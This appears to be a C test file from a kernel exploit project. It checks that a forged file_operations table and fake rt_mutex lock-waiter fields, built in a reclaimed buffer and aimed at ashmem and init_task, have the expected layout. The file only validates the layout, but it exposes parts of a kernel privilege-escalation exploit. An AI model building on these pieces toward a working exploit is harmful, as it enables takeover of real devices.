#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "04_fake_kernel_objects.h"
#include "target.h"

static uint64_t get64(const unsigned char *buf, size_t off) {
  uint64_t value;
  memcpy(&value, buf + off, sizeof(value));
  return value;
}

int main(void) {
  static unsigned char object[TARGET_RECLAIM_BUFFER_SIZE];
  const uint64_t base = TARGET_LINEAR_MAP_BASE + 0x36760000ULL;
  const uint64_t kernel = TARGET_KIMAGE_TEXT_BASE;
  const uint64_t ashmem = kernel + TARGET_ASHMEM_MISC_FOPS_OFF;
  const uint64_t init_task = kernel + TARGET_INIT_TASK_OFF;

  build_fops_install_object(object, base, kernel, ashmem, init_task);
  if (get64(object, TARGET_PRIMARY_FOPS_BUFFER_OFF) != 0 ||
      get64(object, TARGET_PRIMARY_FOPS_BUFFER_OFF + 8) !=
          (base | TARGET_PI_WAITERS_SELF_LIVE_OFF) ||
      get64(object, TARGET_RECOVERY_FOPS_BUFFER_OFF) != 0 ||
      get64(object, TARGET_RECOVERY_FOPS_BUFFER_OFF + 8) !=
          (base | TARGET_PI_WAITERS_SELF_LIVE_OFF) ||
      memcmp(object + TARGET_PRIMARY_FOPS_BUFFER_OFF,
             object + TARGET_RECOVERY_FOPS_BUFFER_OFF,
             TARGET_FAKE_FOPS_POPULATED_SIZE) != 0 ||
      get64(object, TARGET_PRIMARY_FOPS_BUFFER_OFF +
                        TARGET_FOPS_READ_ITER_OFF) == 0 ||
      get64(object, TARGET_PRIMARY_FOPS_BUFFER_OFF +
                        TARGET_FOPS_WRITE_ITER_OFF) == 0 ||
      get64(object, TARGET_PRIMARY_FOPS_BUFFER_OFF + TARGET_FOPS_IOCTL_OFF) ==
          0 ||
      get64(object, TARGET_PRIMARY_FOPS_BUFFER_OFF + TARGET_FOPS_OPEN_OFF) ==
          0 ||
      get64(object,
            TARGET_PRIMARY_FOPS_BUFFER_OFF + TARGET_FOPS_RELEASE_OFF) == 0 ||
      get64(object, TARGET_FAKE_LOCK_WAITERS_ROOT_OFF) !=
          (base | TARGET_LOCK_WAITERS_SELF_LIVE_OFF) ||
      get64(object, TARGET_FAKE_LOCK_WAITERS_LEFTMOST_OFF) !=
          (base | TARGET_LOCK_WAITERS_SELF_LIVE_OFF) ||
      get64(object, TARGET_FAKE_LOCK_OWNER_OFF) != 1) {
    fprintf(stderr, "fake fops layout mismatch\n");
    return 1;
  }
  puts("fake fops owner/layout ok");
  return 0;
}
